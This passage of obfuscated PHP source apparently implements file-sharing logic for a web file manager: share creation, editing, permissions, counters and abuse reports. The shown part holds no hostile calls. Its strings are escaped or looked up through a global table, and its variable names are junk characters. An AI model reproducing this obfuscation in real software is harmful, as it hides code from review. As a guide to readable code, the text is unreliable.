$_SERVER[ïÃ°£«Ê][12], 1, $Ëİ“Ùë†); } } goto DÛĞâœƒô; b¬Èë”‰†Ô: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\162\x65"; protected $dataAuto = array(array("\155\157\144\151\146\171\x54\151\x6d\x65", "\164\151\x6d\x65", "\x69\x6e\x73\x65\162\x74\54\165\160\x64\141\164\x65", "\146\x75\x6e\143\x74\151\157\x6e"), array("\x63\x72\145\141\164\x65\x54\151\155\x65", "\x74\x69\x6d\145", "\x69\156\x73\145\162\164", "\146\x75\156\x63\x74\151\157\156"), array("\x6f\160\x74\x69\157\156\163", '', "\x69\x6e\163\145\162\x74\x2c\x75\160\144\141\x74\x65\54\163\145\x6c\x65\x63\164", "\152\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¡ïèò ) { $¯ë„»Í› =& $_SERVER[ïÃ°£«Ê]; return array($¯ë„»Í›[2326] => array(USER_ID, $¯ë„»Í›[2327]), $¯ë„»Í›[2328] => array($¡ïèò [0], $¯ë„»Í›[2329])); } protected function ___listSimple() { $ÂªÎ¶ª = $this->field($this->fieldList)->where(array($_SERVER[ïÃ°£«Ê][1594] => USER_ID))->select(); return $ÂªÎ¶ª ? $ÂªÎ¶ª : array(); } protected function ___getInfoShare($ğ«è î) { return $this->_getShareInfo(array($_SERVER[ïÃ°£«Ê][687] => $ğ«è î), !1); } protected function getInfo($ºñĞÍåç) { $ ÁƒÆõü = $this->getInfoShare($ºñĞÍåç); return $this->shareSourceInfo($ ÁƒÆõü); } public function getInfoByHash($Í…ò‚è²) { return $this->_getShareInfo(array($_SERVER[ïÃ°£«Ê][1556] => $Í…ò‚è²)); } public function getInfoByPath($û½ŞÛÁ§) { $í– ÈàÆ =& $_SERVER[ïÃ°£«Ê]; $€é‘áü• = array($í– ÈàÆ[1594] => USER_ID, $í– ÈàÆ[191] => $û½ŞÛÁ§); return $this->_getShareInfo($€é‘áü•); } public function getInfoBySourcePath($ãÃ†»£İ) { $ Ä±ğÒ£ =& $_SERVER[ïÃ°£«Ê]; $‰ÅÄûäú = array($ Ä±ğÒ£[1594] => USER_ID, $ Ä±ğÒ£[583] => $ãÃ†»£İ); return $this->_getShareInfo($‰ÅÄûäú); } private function _getShareInfo($æÂèíŞÚ, $¹†‹§‰ = true) { $Âëë„ =& $_SERVER[ïÃ°£«Ê]; $ØŞ¶‘ÒÏ = $this->where($æÂèíŞÚ)->find(); if (!$ØŞ¶‘ÒÏ) { return !1; } if (!is_array($ØŞ¶‘ÒÏ[$Âëë„[580]])) { $ØŞ¶‘ÒÏ[$Âëë„[580]] = array(); } $æÂèíŞÚ = array($Âëë„[687] => $ØŞ¶‘ÒÏ[$Âëë„[687]]); $Ñ¢À•ô = $Âëë„[2330]; $ØŞ¶‘ÒÏ[$Âëë„[1552]] = Model($Âëë„[688])->order($Âëë„[487])->field($Ñ¢À•ô)->where($æÂèíŞÚ)->select(); if (!$¹†‹§‰) { return $ØŞ¶‘ÒÏ; } return $this->shareSourceInfo($ØŞ¶‘ÒÏ); } private function shareSourceInfo($ÕÁÍ “ˆ) { $’ö™ñ§ğ =& $_SERVER[ïÃ°£«Ê]; if (!is_array($ÕÁÍ “ˆ)) { return $ÕÁÍ “ˆ; } if ($ÕÁÍ “ˆ[$’ö™ñ§ğ[191]] == $’ö™ñ§ğ[228]) { $ÕÁÍ “ˆ[$’ö™ñ§ğ[90]] = IO::info($ÕÁÍ “ˆ[$’ö™ñ§ğ[583]]); } else { $ÕÁÍ “ˆ[$’ö™ñ§ğ[90]] = Model($’ö™ñ§ğ[1535])->pathInfo($ÕÁÍ “ˆ[$’ö™ñ§ğ[191]]); } return $ÕÁÍ “ˆ; } protected function getInfoAuth($‹£´ÔÑã) { $Æ™™ÃÙÃ =& $_SERVER[ïÃ°£«Ê]; $¶¿½Å” = $this->getInfo($‹£´ÔÑã); if ($¶¿½Å”[$Æ™™ÃÙÃ[1594]] == USER_ID) { $¶¿½Å”[$Æ™™ÃÙÃ[502]] = $¶¿½Å”[$Æ™™ÃÙÃ[90]][$Æ™™ÃÙÃ[502]]; } else { $¶¿½Å”[$Æ™™ÃÙÃ[502]] = Model($Æ™™ÃÙÃ[587])->authMake($¶¿½Å”[$Æ™™ÃÙÃ[1552]]); } return $¶¿½Å”; } protected function listData($Ëû‰ ‘ = null, $ÁÌÑ­Åâ = 300) { $‚’†òÁÌ =& $_SERVER[ïÃ°£«Ê]; $ıŞ˜ó‡ = array(array($‚’†òÁÌ[578] => array($‚’†òÁÌ[1180], 0), $‚’†òÁÌ[685] => array($‚’†òÁÌ[1180], 0), $‚’†òÁÌ[2331] => $‚’†òÁÌ[2287])); if ($Ëû‰ ‘ == $‚’†òÁÌ[2332]) { $ıŞ˜ó‡ = array($‚’†òÁÌ[578] => 1); } else { if ($Ëû‰ ‘ == $‚’†òÁÌ[1349]) { $ıŞ˜ó‡ = array($‚’†òÁÌ[685] => 1); } } $ıŞ˜ó‡[$‚’†òÁÌ[1594]] = USER_ID; $ÎÀîúú† = $this->where($ıŞ˜ó‡)->selectPage($ÁÌÑ­Åâ); return $ÎÀîúú†; } protected function listToMe($Ê½ìª”· = 300) { $­•¸ôè =& $_SERVER[ïÃ°£«Ê]; $áÎÂôèê = Model($­•¸ôè[2333])->userGroupParents(USER_ID); $µá¯‘æ = array($­•¸ôè[670] => SourceModel::TYPE_USER, $­•¸ôè[589] => USER_ID); if ($áÎÂôèê) { $µá¯‘æ = array(array($­•¸ôè[670] => SourceModel::TYPE_USER, $­•¸ôè[589] => USER_ID), array($­•¸ôè[670] => SourceModel::TYPE_GROUP, $­•¸ôè[589] => array($­•¸ôè[7], $áÎÂôèê)), $­•¸ôè[2331] => $­•¸ôè[2287]); } $ßãÏÙÕ = Model($­•¸ôè[688])->field($­•¸ôè[687])->where($µá¯‘æ)->select(); $ßãÏÙÕ = array_unique(array_to_keyvalue($ßãÏÙÕ, $­•¸ôè[12], $­•¸ôè[687])); $µá¯‘æ = array($­•¸ôè[687] => array($­•¸ôè[507], $ßãÏÙÕ)); if (!$ßãÏÙÕ) { return array($­•¸ôè[446] => array(), $­•¸ôè[443] => array($­•¸ôè[2334] => 0, $­•¸ôè[428] => 1)); } $íãûåˆ¿ = Model($­•¸ôè[688])->where($µá¯‘æ)->select(); $íãûåˆ¿ = array_to_keyvalue_group($íãûåˆ¿, $­•¸ôè[687]); $İõô¨’– = $­•¸ôè[2335]; $–Ä¶‹Ôû = $this->field($İõô¨’–)->where($µá¯‘æ)->selectPage($Ê½ìª”·); foreach ($–Ä¶‹Ôû[$­•¸ôè[446]] as $ÓÌº¥Ñ– => &$ÄêÑÑüÆ) { $ÄêÑÑüÆ[$­•¸ôè[1552]] = $íãûåˆ¿[$ÄêÑÑüÆ[$­•¸ôè[687]]]; } unset($ÄêÑÑüÆ); return $–Ä¶‹Ôû; } protected function shareAdd($¨àÍñø, $œì±§é†) { $è»íú‰ =& $_SERVER[ïÃ°£«Ê]; $’áäá‚ = $this->_addShareData($¨àÍñø, $œì±§é†); if (!empty($œì±§é†[$è»íú‰[2336]])) { $this->_shareAuthSet($’áäá‚, $œì±§é†[$è»íú‰[2336]]); } $this->shareEventAdd($¨àÍñø, $œì±§é†, $è»íú‰[2337]); return $’áäá‚; } protected function shareAddSystem($‹‘ä«’ö, $ˆåˆó‡¡) { $¨ù«÷¹Û =& $_SERVER[ïÃ°£«Ê]; $½È¹ˆØ = $this->_addShareData($‹‘ä«’ö, $ˆåˆó‡¡, $¨ù«÷¹Û[189]); $this->_shareAuthSet($½È¹ˆØ, $ˆåˆó‡¡[$¨ù«÷¹Û[2336]]); return $½È¹ˆØ; } private function shareEventAdd($»¨¦°†é, $Ñ³à°äÚ, $½ùàÍ±¿ = "\141\x64\144") { $¶Õı¯Â =& $_SERVER[ïÃ°£«Ê]; if (!$»¨¦°†é || $»¨¦°†é == $¶Õı¯Â[228]) { return; } if ($½ùàÍ±¿ == $¶Õı¯Â[2337]) { if ($Ñ³à°äÚ[$¶Õı¯Â[578]] == $¶Õı¯Â[91]) { Model($¶Õı¯Â[655])->eventShare($»¨¦°†é, $¶Õı¯Â[2338]); } if ($Ñ³à°äÚ[$¶Õı¯Â[685]] == $¶Õı¯Â[91]) { Model($¶Õı¯Â[655])->eventShare($»¨¦°†é, $¶Õı¯Â[2339]); } return; } $œ˜õ»ã¬ = $this->getInfoByPath($»¨¦°†é); $Æ•äØÔÍ = $¶Õı¯Â[2340]; if ($œ˜õ»ã¬[$¶Õı¯Â[578]] == $¶Õı¯Â[228] && $Ñ³à°äÚ[$¶Õı¯Â[578]] == $¶Õı¯Â[91]) { $Æ•äØÔÍ = $¶Õı¯Â[2338]; } if ($œ˜õ»ã¬[$¶Õı¯Â[578]] == $¶Õı¯Â[91] && $Ñ³à°äÚ[$¶Õı¯Â[578]] == $¶Õı¯Â[228]) { $Æ•äØÔÍ = $¶Õı¯Â[2341]; } if ($œ˜õ»ã¬[$¶Õı¯Â[685]] == $¶Õı¯Â[228] && $Ñ³à°äÚ[$¶Õı¯Â[685]] == $¶Õı¯Â[91]) { $Æ•äØÔÍ = $¶Õı¯Â[2339]; } if ($œ˜õ»ã¬[$¶Õı¯Â[685]] == $¶Õı¯Â[91] && $Ñ³à°äÚ[$¶Õı¯Â[685]] == $¶Õı¯Â[228]) { $Æ•äØÔÍ = $¶Õı¯Â[2342]; } Model($¶Õı¯Â[655])->eventShare($»¨¦°†é, $Æ•äØÔÍ); return; } private function _addShareData($¨¯Ø¼£, $Èàß®­Ú = array(), $ç Éå´Ò = false) { $™û¨¥ =& $_SERVER[ïÃ°£«Ê]; $Éô£ıŞá = $ç Éå´Ò == $™û¨¥[189] ? 0 : USER_ID; $Ê¿µı¦ = array($™û¨¥[506] => $¨¯Ø¼£, $™û¨¥[1971] => $Éô£ıŞá); if ($¨¯Ø¼£ == 0) { $Ê¿µı¦ = array($™û¨¥[2343] => $Èàß®­Ú[$™û¨¥[583]], $™û¨¥[1971] => $Éô£ıŞá); } if ($úŠä = $this->where($Ê¿µı¦)->find()) { return $úŠä[$™û¨¥[687]]; } if ($¨¯Ø¼£ == 0) { $˜¦œ­ÜØ = array($™û¨¥[32] => get_path_this($Èàß®­Ú[$™û¨¥[87]])); } else { $˜¦œ­ÜØ = Model($™û¨¥[934])->sourceInfo($¨¯Ø¼£); if (!$˜¦œ­ÜØ) { return !1; } } if (!$Èàß®­Ú[$™û¨¥[1869]]) { $Èàß®­Ú[$™û¨¥[1869]] = $˜¦œ­ÜØ[$™û¨¥[32]]; } $‹É°Åì = array($™û¨¥[1971] => $Éô£ıŞá, $™û¨¥[506] => $¨¯Ø¼£, $™û¨¥[1869] => $™û¨¥[12], $™û¨¥[578] => 0, $™û¨¥[685] => 0, $™û¨¥[583] => $™û¨¥[12], $™û¨¥[382] => $™û¨¥[12], $™û¨¥[1051] => $™û¨¥[12], $™û¨¥[2344] => 0, $™û¨¥[2345] => 0, $™û¨¥[863] => 0, $™û¨¥[580] => $™û¨¥[12], $™û¨¥[1556] => $™û¨¥[12]); $ §çäéĞ = explode($™û¨¥[50], $™û¨¥[2346]); foreach ($ §çäéĞ as $ÙüÒŒÌ) { if (!isset($Èàß®­Ú[$ÙüÒŒÌ])) { continue; } $‹É°Åì[$ÙüÒŒÌ] = $Èàß®­Ú[$ÙüÒŒÌ]; } $©Èª»Ûû = $this->add($‹É°Åì); $¢©…©Ÿƒ = array($™û¨¥[1556] => short_id($©Èª»Ûû)); if ($this->where($¢©…©Ÿƒ)->find()) { $¢©…©Ÿƒ[$™û¨¥[1556]] .= $™û¨¥[476] . rand_string(2, 3); } $this->where(array($™û¨¥[2347] => $©Èª»Ûû))->save($¢©…©Ÿƒ); return $©Èª»Ûû; } private function _shareAuthSet($ù‹ªÊ², $Åâò·‘÷) { $ãÓöèÀŠ =& $_SERVER[ïÃ°£«Ê]; if (!is_array($Åâò·‘÷)) { return !1; } $ÔÅŞÖ˜… = Model($ãÓöèÀŠ[2296]); $ÔÅŞÖ˜…->where(array($ãÓöèÀŠ[687] => $ù‹ªÊ²))->delete(); $Í´Æí‚Ë = array(); foreach ($Åâò·‘÷ as $­ª æâÄ) { $§ì‡›Û = SourceModel::TYPE_USER; if ($­ª æâÄ[$ãÓöèÀŠ[188]] == SourceModel::TYPE_GROUP) { $§ì‡›Û = SourceModel::TYPE_GROUP; } $‡ŠÏßú¿ = array($ãÓöèÀŠ[687] => $ù‹ªÊ², $ãÓöèÀŠ[188] => $§ì‡›Û, $ãÓöèÀŠ[589] => intval($­ª æâÄ[$ãÓöèÀŠ[589]]), $ãÓöèÀŠ[1642] => 0, $ãÓöèÀŠ[2348] => -1); if ($­ª æâÄ[$ãÓöèÀŠ[1642]]) { $‡ŠÏßú¿[$ãÓöèÀŠ[1642]] = $­ª æâÄ[$ãÓöèÀŠ[1642]]; } else { if ($­ª æâÄ[$ãÓöèÀŠ[2348]]) { $‡ŠÏßú¿[$ãÓöèÀŠ[2348]] = $­ª æâÄ[$ãÓöèÀŠ[2348]]; } } $Í´Æí‚Ë[] = $‡ŠÏßú¿; } return $ÔÅŞÖ˜…->addAll($Í´Æí‚Ë, array(), !0); } public function numViewAdd($œÆîŒ·) { $œ»·Ï =& $_SERVER[ïÃ°£«Ê]; $ÈÔÒ¬ä = array($œ»·Ï[2347] => $œÆîŒ·); $this->where($ÈÔÒ¬ä)->setAdd($œ»·Ï[2344]); } public function numDownloadAdd($®ˆœ‰ˆú) { $âéñ‰¥ş =& $_SERVER[ïÃ°£«Ê]; $ïÄë•® = array($âéñ‰¥ş[2347] => $®ˆœ‰ˆú); $this->where($ïÄë•®)->setAdd($âéñ‰¥ş[2345]); } protected function shareEdit($ãº´óåã, $ÆãöèŸ£) { $Ï‚ëò”¢ =& $_SERVER[ïÃ°£«Ê]; $Ò³’§»ø = $this->getInfo($ãº´óåã); if (!$Ò³’§»ø) { return !1; } if ($ÆãöèŸ£[$Ï‚ëò”¢[1556]] && $ÆãöèŸ£[$Ï‚ëò”¢[578]] == $Ï‚ëò”¢[91]) { if ($ÆãöèŸ£[$Ï‚ëò”¢[1556]] == $Ò³’§»ø[$Ï‚ëò”¢[1556]]) { unset($ÆãöèŸ£[$Ï‚ëò”¢[1556]]); } if ($ÆãöèŸ£[$Ï‚ëò”¢[1556]]) { $şâ“àºà = $this->where(array($Ï‚ëò”¢[2349] => $ÆãöèŸ£[$Ï‚ëò”¢[1556]]))->find(); if ($şâ“àºà) { return !1; } if (!is_array($ÆãöèŸ£[$Ï‚ëò”¢[580]])) { $ÆãöèŸ£[$Ï‚ëò”¢[580]] = is_array($Ò³’§»ø[$Ï‚ëò”¢[580]]) ? $Ò³’§»ø[$Ï‚ëò”¢[580]] : array(); } if (!$ÆãöèŸ£[$Ï‚ëò”¢[580]][$Ï‚ëò”¢[2350]]) { $ÆãöèŸ£[$Ï‚ëò”¢[580]][$Ï‚ëò”¢[2350]] = $Ò³’§»ø[$Ï‚ëò”¢[1556]]; $ÆãöèŸ£[$Ï‚ëò”¢[580]][$Ï‚ëò”¢[2351]] = $Ï‚ëò”¢[91]; } } } $this->_checkLinkShare($ÆãöèŸ£, $Ò³’§»ø); $Âä³•³ = array(); $€ñ‚ùÔ = explode($Ï‚ëò”¢[50], $Ï‚ëò”¢[2352]); foreach ($€ñ‚ùÔ as $ØÙ‰ÒİŒ) { if (!array_key_exists($ØÙ‰ÒİŒ, $ÆãöèŸ£)) { continue; } $Âä³•³[$ØÙ‰ÒİŒ] = $ÆãöèŸ£[$ØÙ‰ÒİŒ]; } $this->shareEventAdd($Ò³’§»ø[$Ï‚ëò”¢[191]], $ÆãöèŸ£, $Ï‚ëò”¢[1563]); $this->where(array($Ï‚ëò”¢[2347] => $ãº´óåã))->save($Âä³•³); if (isset($ÆãöèŸ£[$Ï‚ëò”¢[2336]])) { $this->_shareAuthSet($ãº´óåã, $ÆãöèŸ£[$Ï‚ëò”¢[2336]]); } return !0; } private function _checkLinkShare($€ÍŸ¾î, $®±…Úøû) { $„©¼·º¦ =& $_SERVER[ïÃ°£«Ê]; if ($€ÍŸ¾î[$„©¼·º¦[578]] != $„©¼·º¦[91]) { return; } $Åœ³¼£İ = $®±…Úøû[$„©¼·º¦[90]][$„©¼·º¦[191]]; if ($®±…Úøû[$„©¼·º¦[90]][$„©¼·º¦[33]] != $„©¼·º¦[230]) { $ğÁ¹ïğ· = $this->_folderReport($Åœ³¼£İ); if (!$ğÁ¹ïğ·) { return; } show_json(LNG($„©¼·º¦[2353]) . $„©¼·º¦[2354] . $ğÁ¹ïğ·, !1); } $í¿öÛŸÃ = Model($„©¼·º¦[934])->fileInfoGet($®±…Úøû[$„©¼·º¦[90]][$„©¼·º¦[191]]); if (!$í¿öÛŸÃ) { return; } $¯œïØÕ« = $this->shareFileMeta($í¿öÛŸÃ[$„©¼·º¦[557]]); if (isset($¯œïØÕ«[$„©¼·º¦[451]]) && $¯œïØÕ«[$„©¼·º¦[451]] == $„©¼·º¦[91]) { show_json(LNG($„©¼·º¦[2355]), !1); } } private function _folderReport($Ğ¿õì£) { $±Æœ =& $_SERVER[ïÃ°£«Ê]; $‰û¬Í®À = array($±Æœ[557] => array($±Æœ[1180], 0), $±Æœ[851] => 3); $ƒ…’¾‘ = Model($±Æœ[2356])->where($‰û¬Í®À)->field($±Æœ[557])->select(); if (!$ƒ…’¾‘) { return !1; } $ƒ…’¾‘ = array_to_keyvalue($ƒ…’¾‘, $±Æœ[12], $±Æœ[557]); $à±÷‘Ë = $±Æœ[50] . $Ğ¿õì£ . $±Æœ[50]; $‰û¬Í®À = array($±Æœ[557] => array($±Æœ[7], $ƒ…’¾‘), $±Æœ[604] => array($±Æœ[473], "\45{$à±÷‘Ë}\x25"), $±Æœ[520] => 0); $¹–¼ƒŒØ = Model($±Æœ[934])->where($‰û¬Í®À)->field($±Æœ[2357])->find(); if (!$¹–¼ƒŒØ) { return !1; } $¢¨ÅøĞ = substr($¹–¼ƒŒØ[$±Æœ[604]], strpos($¹–¼ƒŒØ[$±Æœ[604]], $à±÷‘Ë)); $‰û¬Í®À = array($±Æœ[191] => array($±Æœ[7], trim($¢¨ÅøĞ, $±Æœ[50]))); $£´ÊÔø = Model($±Æœ[934])->where($‰û¬Í®À)->field($±Æœ[32])->select(); $áÑŞâ = array_to_keyvalue($£´ÊÔø, $±Æœ[12], $±Æœ[32]); $áÑŞâ[] = $¹–¼ƒŒØ[$±Æœ[32]]; return implode($±Æœ[8], $áÑŞâ); } protected function remove($«ÃıÇˆÇ) { $‘ö²òı =& $_SERVER[ïÃ°£«Ê]; $îªİñî„ = is_array($«ÃıÇˆÇ) ? $«ÃıÇˆÇ : array($«ÃıÇˆÇ); for ($ï„ë†¶ = 0; $ï„ë†¶ < count($îªİñî„); $ï„ë†¶++) { $ÈßÒóº = $this->getInfo($îªİñî„[$ï„ë†¶]); if ($ÈßÒóº[$‘ö²òı[685]] == $‘ö²òı[91]) { Model($‘ö²òı[655])->eventShare($ÈßÒóº[$‘ö²òı[191]], $‘ö²òı[2342]); } if ($ÈßÒóº[$‘ö²òı[578]] == $‘ö²òı[91]) { Model($‘ö²òı[655])->eventShare($ÈßÒóº[$‘ö²òı[191]], $‘ö²òı[2341]); } } $—¥ù‹˜€ = array($‘ö²òı[687] => array($‘ö²òı[7], $îªİñî„)); $æˆØş­ = $this->where($—¥ù‹˜€)->delete(); if ($æˆØş­) { Model($‘ö²òı[688])->where($—¥ù‹˜€)->delete(); } return $æˆØş­; } protected function removeBySource($ğß²åÈÖ) { $¾ğÉ¼‰ü =& $_SERVER[ïÃ°£«Ê]; $ôÚÑµÇª = array($¾ğÉ¼‰ü[506] => array($¾ğÉ¼‰ü[507], $ğß²åÈÖ)); $åäšş² = $this->field($¾ğÉ¼‰ü[687])->where($ôÚÑµÇª)->select(); $Áƒ‡Ÿ‰ = array_to_keyvalue($åäšş², $¾ğÉ¼‰ü[12], $¾ğÉ¼‰ü[687]); if (!$Áƒ‡Ÿ‰) { return; } foreach ($åäšş² as $ÚÚä‡ŞÚ) { $this->cacheFunctionClear($¾ğÉ¼‰ü[2358], $ÚÚä‡ŞÚ[$¾ğÉ¼‰ü[687]]); } $ôÚÑµÇª = array($¾ğÉ¼‰ü[2347] => array($¾ğÉ¼‰ü[507], $Áƒ‡Ÿ‰)); $this->where($ôÚÑµÇª)->delete(); Model($¾ğÉ¼‰ü[688])->where($ôÚÑµÇª)->delete(); } public function listAll($–»«Òô‘) { $µ¬‡áø =& $_SERVER[ïÃ°£«Ê]; $èãşÔ†£ = array(); if ($–»«Òô‘[$µ¬‡áø[1594]]) { $èãşÔ†£[$µ¬‡áø[1594]] = $–»«Òô‘[$µ¬‡áø[1594]]; } if ($–»«Òô‘[$µ¬‡áø[862]]) { $½€™ìëÍ = $–»«Òô‘[$µ¬‡áø[863]] ? $–»«Òô‘[$µ¬‡áø[863]] : strtotime(date($µ¬‡áø[2359])); $èãşÔ†£[$µ¬‡áø[231]] = array($µ¬‡áø[408], array($–»«Òô‘[$µ¬‡áø[862]], $½€™ìëÍ)); } if ($–»«Òô‘[$µ¬‡áø[33]]) { $èãşÔ†£[$–»«Òô‘[$µ¬‡áø[33]]] = 1; } else { $èãşÔ†£[] = array($µ¬‡áø[578] => array($µ¬‡áø[1180], 0), $µ¬‡áø[685] => array($µ¬‡áø[1180], 0), $µ¬‡áø[2331] => $µ¬‡áø[2287]); } if ($–»«Òô‘[$µ¬‡áø[2283]]) { $èãşÔ†£[] = array($µ¬‡áø[1556] => $–»«Òô‘[$µ¬‡áø[2283]], $µ¬‡áø[1869] => array($µ¬‡áø[473], "\45{$–»«Òô‘[$µ¬‡áø[2283]]}\x25"), $µ¬‡áø[2331] => $µ¬‡áø[2287]); } $µÃš™ûÜ = $this->_makeOrder()->where($èãşÔ†£)->selectPage(20); if (empty($µÃš™ûÜ[$µ¬‡áø[446]])) { return array(); } $this->_listDataApply($µÃš™ûÜ[$µ¬‡áø[446]]); return $µÃš™ûÜ; } public function listDataApply($°¯Â‡Êë) { $this->_listDataApply($°¯Â‡Êë); return $°¯Â‡Êë; } private function _listDataApply(&$Ã©è¤Œ) { $“öù–« =& $_SERVER[ïÃ°£«Ê]; $Ö¸øì¼Ù = array_to_keyvalue($Ã©è¤Œ, $“öù–«[12], $“öù–«[1594]); $ëòğúâÇ = Model($“öù–«[617])->userListInfo(array_unique($Ö¸øì¼Ù)); $ÜÖ¿ĞŒó = array_to_keyvalue($Ã©è¤Œ, $“öù–«[12], $“öù–«[191]); $Šˆú¸ó˜ = Model($“öù–«[934])->sourceListInfo($ÜÖ¿ĞŒó, !0); foreach ($Ã©è¤Œ as $ºÜöœÏõ => &$ç‹“û×‹) { $ê¹Ÿúµ† = $ç‹“û×‹[$“öù–«[1594]]; $ç‹“û×‹[$“öù–«[2360]] = $ëòğúâÇ[$ê¹Ÿúµ†] ? $ëòğúâÇ[$ê¹Ÿúµ†] : !1; if (!$ç‹“û×‹[$“öù–«[2360]] || $ç‹“û×‹[$“öù–«[2360]][$“öù–«[851]] != $“öù–«[91]) { unset($Ã©è¤Œ[$ºÜöœÏõ]); continue; } $®»–ı…¢ = $ç‹“û×‹[$“öù–«[191]]; $ç‹“û×‹[$“öù–«[90]] = $Šˆú¸ó˜[$®»–ı…¢] ? $Šˆú¸ó˜[$®»–ı…¢] : !1; if ($ç‹“û×‹[$“öù–«[90]][$“öù–«[520]] == $“öù–«[91]) { unset($Ã©è¤Œ[$ºÜöœÏõ]); } if ($ç‹“û×‹[$“öù–«[90]] != $“öù–«[228] && !$ç‹“û×‹[$“öù–«[90]]) { unset($Ã©è¤Œ[$ºÜöœÏõ]); } } unset($ç‹“û×‹); $Ã©è¤Œ = array_values($Ã©è¤Œ); } private function _makeOrder($êˆ¦Åé = '') { $‰Ä»ÌÊË =& $_SERVER[ïÃ°£«Ê]; $ãàÜÂˆ¤ = array($‰Ä»ÌÊË[231], $‰Ä»ÌÊË[863], $‰Ä»ÌÊË[2344], $‰Ä»ÌÊË[2345]); $õª­¹¾¬ = array($‰Ä»ÌÊË[537] => $‰Ä»ÌÊË[538], $‰Ä»ÌÊË[539] => $‰Ä»ÌÊË[540]); $–¯¶ï— = Input::get($‰Ä»ÌÊË[544], $‰Ä»ÌÊË[7], $‰Ä»ÌÊË[512], $ãàÜÂˆ¤); $—««¹Å = Input::get($‰Ä»ÌÊË[545], $‰Ä»ÌÊË[7], $‰Ä»ÌÊË[2361], array($‰Ä»ÌÊË[2280], $‰Ä»ÌÊË[539])); $—««¹Å = $õª­¹¾¬[$—««¹Å]; $êˆ¦Åé = $êˆ¦Åé . "{$–¯¶ï—}\x20{$—««¹Å}"; return $this->order($êˆ¦Åé); } public function reportAdd($‰å›‚ø) { $á½‰ë¥ =& $_SERVER[ïÃ°£«Ê]; $Ùó‰ñ§Ú = array($á½‰ë¥[687] => $‰å›‚ø[$á½‰ë¥[687]], $á½‰ë¥[1594] => USER_ID); if (Model($á½‰ë¥[2356])->where($Ùó‰ñ§Ú)->find()) { return !1; } $öª—æ‚ = array($á½‰ë¥[687] => $‰å›‚ø[$á½‰ë¥[687]], $á½‰ë¥[1869] => $‰å›‚ø[$á½‰ë¥[1869]], $á½‰ë¥[191] => $‰å›‚ø[$á½‰ë¥[191]], $á½‰ë¥[557] => $‰å›‚ø[$á½‰ë¥[557]], $á½‰ë¥[1594] => USER_ID, $á½‰ë¥[33] => $‰å›‚ø[$á½‰ë¥[33]], $á½‰ë¥[540] => $‰å›‚ø[$á½‰ë¥[540]]); return Model($á½‰ë¥[2356])->add($öª—æ‚); } public function reportList($÷áŞÅĞÂ) { $¢†Ç´à® =& $_SERVER[ïÃ°£«Ê]; $ï¹Ú±ö» = array(); if ($÷áŞÅĞÂ[$¢†Ç´à®[862]]) { $’øÄ¹»ò = $÷áŞÅĞÂ[$¢†Ç´à®[863]] ? $÷áŞÅĞÂ[$¢†Ç´à®[863]] : strtotime(date($¢†Ç´à®[2359])); $ï¹Ú±ö»[$¢†Ç´à®[231]] = array($¢†Ç´à®[408], array($÷áŞÅĞÂ[$¢†Ç´à®[862]], $’øÄ¹»ò)); } if (isset($÷áŞÅĞÂ[$¢†Ç´à®[33]]) && in_array($÷áŞÅĞÂ[$¢†Ç´à®[33]], array($¢†Ç´à®[91], $¢†Ç´à®[524], $¢†Ç´à®[2362], $¢†Ç´à®[2363], $¢†Ç´à®[2364]))) { $ï¹Ú±ö»[$¢†Ç´à®[33]] = $÷áŞÅĞÂ[$¢†Ç´à®[33]]; } if (isset($÷áŞÅĞÂ[$¢†Ç´à®[851]]) && in_array($÷áŞÅĞÂ[$¢†Ç´à®[851]], array($¢†Ç´à®[228], $¢†Ç´à®[91], $¢†Ç´à®[524], $¢†Ç´à®[2362]))) { $ï¹Ú±ö»[$¢†Ç´à®[851]] = $÷áŞÅĞÂ[$¢†Ç´à®[851]]; } $º€æŠ×Ç = Input::get($¢†Ç´à®[545], $¢†Ç´à®[7], $¢†Ç´à®[2361], array($¢†Ç´à®[2280], $¢†Ç´à®[539])); $Éˆ€ëÍõ = array($¢†Ç´à®[537] => $¢†Ç´à®[538], $¢†Ç´à®[539] => $¢†Ç´à®[540]); $ÃóŠ÷¿¸ = $¢†Ç´à®[2365] . $Éˆ€ëÍõ[$º€æŠ×Ç]; $şª¿˜ä = Model($¢†Ç´à®[2356])->where($ï¹Ú±ö»)->order($ÃóŠ÷¿¸)->selectPage(20); if (empty($şª¿˜ä[$¢†Ç´à®[446]])) { return array(); } $Ş­îèÎĞ = array_to_keyvalue_group($şª¿˜ä[$¢†Ç´à®[446]], $¢†Ç´à®[851], $¢†Ç´à®[687]); if (!empty($Ş­îèÎĞ[0])) { $÷áŞÅĞÂ = $Ş­îèÎĞ[0]; $ï¹Ú±ö» = array($¢†Ç´à®[687] => array($¢†Ç´à®[7], $÷áŞÅĞÂ)); $Õ”ß‚›ì = $this->where($ï¹Ú±ö»)->field($¢†Ç´à®[687])->select(); $Õ”ß‚›ì = array_to_keyvalue($Õ”ß‚›ì, $¢†Ç´à®[12], $¢†Ç´à®[687]); $—Ñ­ìÇÍ = array_diff($÷áŞÅĞÂ, $Õ”ß‚›ì); if (!empty($—Ñ­ìÇÍ)) { foreach ($şª¿˜ä[$¢†Ç´à®[446]] as $âêÌ‡­ => $ò«ƒŠã°) { if (in_array($ò«ƒŠã°[$¢†Ç´à®[687]], $—Ñ­ìÇÍ)) { unset($şª¿˜ä[$¢†Ç´à®[446]][$âêÌ‡­]); } } } } $this->_listDataApply($şª¿˜ä[$¢†Ç´à®[446]]); return $şª¿˜ä; } public function reportStatus($ø¶€ë§Š) { $Ô…Ÿ…ì¢ =& $_SERVER[ïÃ°£«Ê]; $­¸ª—´Ø = array($Ô…Ÿ…ì¢[487] => $ø¶€ë§Š[$Ô…Ÿ…ì¢[487]]); $±§œ’ºş = Model($Ô…Ÿ…ì¢[2356])->where($­¸ª—´Ø)->field($Ô…Ÿ…ì¢[2366])->find(); if (!$±§œ’ºş) { return !1; } $œ•Ó¨›Ü = array($Ô…Ÿ…ì¢[851] => $ø¶€ë§Š[$Ô…Ÿ…ì¢[851]]); if ($ø¶€ë§Š[$Ô…Ÿ…ì¢[851]] == $Ô…Ÿ…ì¢[2362] && $±§œ’ºş[$Ô…Ÿ…ì¢[851]] == $Ô…Ÿ…ì¢[2362]) { $œ•Ó¨›Ü[$Ô…Ÿ…ì¢[851]] = 0; } $šò»¡Ä‹ = Model($Ô…Ÿ…ì¢[2356])->where($­¸ª—´Ø)->save($œ•Ó¨›Ü); if ($ø¶€ë§Š[$Ô…Ÿ…ì¢[851]] == $Ô…Ÿ…ì¢[524]) { if 